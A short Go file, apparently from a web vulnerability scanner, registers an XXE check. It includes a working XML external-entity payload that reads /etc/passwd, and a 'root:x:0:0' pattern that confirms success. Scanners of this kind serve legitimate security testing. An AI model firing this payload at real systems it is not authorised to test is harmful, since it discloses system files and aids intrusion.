package vuln

func init() {
	vulns = append(vulns, VulnCheck{
		Name:    "XXE",
		Param:   "xml",
		Payload: `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
		Match:   `root:x:0:0`,
		Method:  "POST",
	})
}
